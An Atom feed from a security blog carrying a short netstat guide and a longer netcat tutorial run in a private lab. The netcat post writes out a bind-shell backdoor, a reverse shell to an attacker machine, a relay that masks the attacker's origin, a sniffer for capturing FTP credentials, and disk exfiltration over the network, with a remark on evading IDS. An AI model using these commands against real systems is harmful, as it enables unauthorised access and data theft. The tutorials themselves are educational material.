<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: networking | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/networking/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-06-11T14:12:28-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Network tools - netstat]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/11/network-tools-netstat/"/>
    <updated>2014-06-11T14:14:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/11/network-tools-netstat</id>
    <content type="html"><![CDATA[<p>Netstat is a very important tool for gathering information about the connections on a machine or troubleshooting network problems. It&rsquo;s a default utility for both Windows and Linux, thus there is no excuse in not getting familiar with it, it&rsquo;s very useful for any system admin, network guy or good old home user that would like to know what really is coming and going to and from his computer.</p>

<!-- more -->


<p>If ran with no arguments, netstat produses an overwhelming output of all the open sockets in the system. Here is its <em>man</em> page description:</p>

<blockquote><p>netstat  &ndash; Print network connections, routing tables, interface statistics,
masquerade connections, and multicast memberships</p></blockquote>

<p>Netstat is great when run with specific flags to zoom in on the information that is relevant to us. Here are some examples:</p>

<p><strong>Display the PID and the name of the program to which eack socket belongs, along with the path</strong></p>

<p><img class="center" src="/images/netstat-p.png" title="&lsquo;netstat -p&rsquo; &lsquo;netstat &mdash;program&rsquo;" ></p>

<p><strong>Display only listening sockets</strong></p>

<p><img class="center" src="/images/netstat-l.png" title="&lsquo;netstat -l&rsquo; &lsquo;netstat &mdash;listening&rsquo;" ></p>

<p><strong>Display all ports (both listening and non-listening</strong></p>

<p><img class="center" src="/images/netstat-a.png" title="&lsquo;netstat -a&rsquo; &lsquo;netstat &mdash;all&rsquo;" ></p>

<p><strong>Display listening sockets and established connections</strong></p>

<p><img class="center" src="/images/netstat-ap.png" title="&lsquo;netstat -ap&rsquo; &lsquo;netstat -ap&rsquo;" ></p>

<p><strong>Display TCP ports and connections</strong></p>

<p><img class="center" src="/images/netstat-at.png" title="&lsquo;netstat -at&rsquo; &lsquo;netstat tcp&rsquo;" ></p>

<p><strong>Display TCP statistics</strong></p>

<p><img class="center" src="/images/netstat-st.png" title="&lsquo;netstat -st&rsquo; &lsquo;netstat stats&rsquo;" ></p>

<p><strong>Display kernel routing tables</strong></p>

<p><img class="center" src="/images/netstat-r.png" title="&lsquo;netstat -r&rsquo; &lsquo;netstat route&rsquo;" ></p>

<p><strong>Display all TCP connections and listening ports using numeric values for addresses and ports, instead of resolving their names</strong></p>

<p><img class="center" src="/images/netstat-antp.png" title="&lsquo;netstat -antp&rsquo; &lsquo;netstat antp&rsquo;" ></p>

<blockquote><p>Q:    Why is Poland just like the United States?
A:    In the United States you can&rsquo;t buy anything for zlotys and in
  Poland you can&rsquo;t either, while in the U.S. you can get whatever
  you want for dollars, just as you can in Poland.
  &mdash; being told in Poland, 1987</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - Netcat]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/"/>
    <updated>2014-05-30T17:20:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/30/network-tools-netcat</id>
    <content type="html"><![CDATA[<p>In this tutorial I will cover some of the uses of netcat, known as the &ldquo;TCP/IP Swiss army knife&rdquo;. Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.</p>

<!-- more -->


<p>There are many netcat variations, some are more recent and have been rewritten to include more features. Let&rsquo;s look at the original netcat man page:</p>

<blockquote><p>netcat is a simple unix utility which reads and writes data across net-
work connections, using TCP or UDP protocol. It is  designed  to  be  a
reliable  &ldquo;back-end&rdquo; tool that can be used directly or easily driven by
other programs and scripts.  At the same time,  it  is  a  feature-rich
network  debugging and exploration tool, since it can create almost any
kind of connection you would need and has several interesting  built-in
capabilities.</p></blockquote>

<p>Ok, so let&rsquo;s see some of the many ways we can use netcat.</p>

<h3>Banner grabbing</h3>

<p>First, let&rsquo;s see what we can glean from using netcat to connect to an FTP server:</p>

<p><code>plain
nc 192.168.127.130 21
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 17:23. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
</code></p>

<p>As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it&rsquo;s possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.</p>

<p>Now let&rsquo;s try banner grabbing from an HTTP server by sending a HEAD request:</p>

<p>``` plain
nc 192.168.127.130 80
HEAD / HTTP/1.0</p>

<p>HTTP/1.1 200 OK
Date: Fri, 21 Feb 2014 17:51:58 GMT
Server: Apache/2.2.14 (Ubuntu)
Last-Modified: Tue, 10 May 2011 16:01:46 GMT
ETag: &ldquo;27bda-b1-4a2ee12abae80&rdquo;
Accept-Ranges: bytes
Content-Length: 177
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
```</p>

<p>This information can vary as well, this time the bit we&rsquo;re interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.</p>

<h3>Chat server</h3>

<p>Let&rsquo;s now look at how easy it is to use netcat for a very simple chat server.</p>

<p><code>plain
nc -v -l -p 4444
listening on [any] 4444 ...
</code></p>

<p>In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.</p>

<p>Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:</p>

<p><img class="center" src="/images/nc_chat.png" title="&lsquo;nc_chat&rsquo; &lsquo;chat&rsquo;" ></p>

<h3>File transfer</h3>

<p>To transfer files between 2 machines, netcat can be used in the following way. On one computer, let&rsquo;s tell netcat to listen on a port and push a file to the socket:</p>

<p><code>plain
nc -v -l -p 4444 &lt; confidential.txt
listening on [any] 4444 ...
</code></p>

<p>Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:</p>

<p><code>plain
nc -v 192.168.127.130 4444 &gt; transfer.txt
192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.127.130] 4444 (?) open
</code></p>

<p>Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn&rsquo;t give any indication of the transfer progress or its completion.</p>

<h3>Port scanning</h3>

<p>Netcat can also be used as a very basic port scanner:</p>

<p><code>plain
nc -v -n -z -w1 192.168.127.130 1-1000
(UNKNOWN) [192.168.127.130] 80 (www) open
(UNKNOWN) [192.168.127.130] 21 (ftp) open
</code></p>

<p>Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.</p>

<h3>Port forwarding</h3>

<p>Netcat&rsquo;s port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.</p>

<p>For this example, I will be using the following:</p>

<p>``` plain</p>

<pre><code>Attacker machine: 192.168.127.133
Relaying machine: 192.168.127.130
Victim machine: 192.168.127.129
</code></pre>

<p>```</p>

<p>On the relay, use the following command:</p>

<p><code>plain
nc -l -p 4444 -c "nc 192.168.127.129 22"
</code></p>

<p>This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn&rsquo;t have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.</p>

<p>From the attacker machine, connect to the proxy:</p>

<p><code>plain
nc 192.168.127.130 4444
SSH-2.0-OpenSSH_5.9
</code></p>

<p>Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let&rsquo;s confirm that we have a connection:</p>

<p><code>plain
netstat -antp | grep 22
tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -
</code></p>

<p>So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.</p>

<h3>Remote backdoor &ndash; Bind shell</h3>

<p>Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it&rsquo;s best to have administrative privileges for full power over the system.</p>

<p>On the machine you want to backdoor, use netcat to bind the shell:</p>

<p><code>plain
nc -v -l -p 5555 -e /bin/bash
</code></p>

<p>Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won&rsquo;t be any prompt or anything like that. Just type commands in the terminal.</p>

<p><img class="center" src="/images/nc_bindshell.png" title="&lsquo;nc_bindshell&rsquo; &lsquo;Bind shell&rsquo;" ></p>

<h3>Reverse shell</h3>

<p>The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can&rsquo;t be directly accessed from the internet.</p>

<p>So, let&rsquo;s get on with it and start a listener on the attacking machine:</p>

<p><code>plain
nc -v -l -n -p 5555
listening on [any] 5555 ...
</code></p>

<p>Now let&rsquo;s connect from the victim machine:</p>

<p><code>plain
nc -v -n 192.168.127.130 5555 -e /bin/bash
(UNKNOWN) [192.168.127.130] 5555 (?) open
</code></p>

<p>Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.</p>

<p><img class="center" src="/images/nc_reverse.png" title="&lsquo;nc_reverse&rsquo; &lsquo;reverse shell&rsquo;" ></p>

<h3>Honeypot</h3>

<p>It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:</p>

<p><code>plain
nc -vv -l -n -p 21 &lt; banner.txt | cat &gt; log.txt
</code></p>

<p>The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let&rsquo;s connect to port 21 and see what we get:</p>

<p><img class="center" src="/images/nc_honeypot.png" title="&lsquo;nc_honeypot&rsquo; &lsquo;honeypot&rsquo;" ></p>

<p>Here we&rsquo;re seeing the familiar FTP banner even though there&rsquo;s no real FTP server running. We send some random data and now let&rsquo;s check on the other machine that this data has been logged:</p>

<p><img class="center" src="/images/nc_log.png" title="&lsquo;nc_log&rsquo; &lsquo;Log output&rsquo;" ></p>

<p>Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.</p>

<h3>Sniffer</h3>

<p>Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we&rsquo;ll use netcat to listen on some other port and execute a script:</p>

<p><code>plain
nc -l -p 4444 -n -vv -e /root/sniff
listening on [any] 4444 ...
</code></p>

<p>The script file contains the following:</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>nc -o /root/log 192.168.127.130 21
```</p>

<p>The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let&rsquo;s try connecting from another machine to the port that netcat listens on:</p>

<p><img class="center" src="/images/nc_ftp.png" title="&lsquo;nc_ftp&rsquo; &lsquo;FTP&rsquo;" ></p>

<p>Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.</p>

<p>Let&rsquo;s check what got logged on the other machine:</p>

<p><em>cat /root/log | more</em></p>

<p><img class="center" src="/images/nc_hex.png" title="&lsquo;nc_hexdump&rsquo; &lsquo;dump&rsquo;" ></p>

<p>There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.</p>

<h3>Disk cloning</h3>

<p>Yes, you can even copy hard disks over the network with netcat, in conjunction with the <em>dd</em> program.</p>

<p>On the system that you want to copy from, run this:</p>

<p><code>plain
dd if=/dev/sda | nc 192.168.127.130 5555
</code></p>

<p>And on the machine you&rsquo;re copying to:</p>

<p><code>plain
nc -l -p 5555 | dd of=/dev/sda
</code></p>

<p>Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.</p>

<p>I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.</p>

<blockquote><p>If more of us valued food and cheer and song above hoarded gold, it would
be a merrier world.
&mdash; J.R.R. Tolkien</p></blockquote>
]]></content>
  </entry>
  
</feed>
